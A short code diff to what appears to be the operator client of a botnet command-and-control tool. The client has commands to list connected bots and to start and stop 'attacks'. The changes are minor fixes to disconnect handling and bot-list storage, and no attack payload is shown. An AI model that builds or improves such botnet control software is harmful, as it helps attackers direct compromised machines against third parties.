@@ -3,9 +3,12 @@ import socket
 import argparse
 import os
 import sys
+import time
 
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
+
+botList = []
 
 
 class Send(threading.Thread):
@@ -67,11 +70,14 @@ stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects
 
     def disconnect(self):
         self.sock.sendall('disconnect:'.encode(ENCODING))
+        time.sleep(1)
+        self.sock.close()
         print('Disconnecting...')
-    
+        os._exit(0)
+
     
     def listbot(self):
-        self.cock.sendall('listbot:'.encode(ENCODING))
+        self.sock.sendall('listbot:'.encode(ENCODING))
         print('Client: requesting bot list')
 
 class Receive(threading.Thread):
@@ -122,6 +128,10 @@ class Receive(threading.Thread):
             elif req_type == 'listbot':
                 if len(request[1]):
                     self.botlist = request[1]
+                    time.sleep(1)
+                    global botList
+                    botList = self.botlist
+
                     print(f'Bots:\n{self.botlist}')
                 else:
                     print("No bots connected")
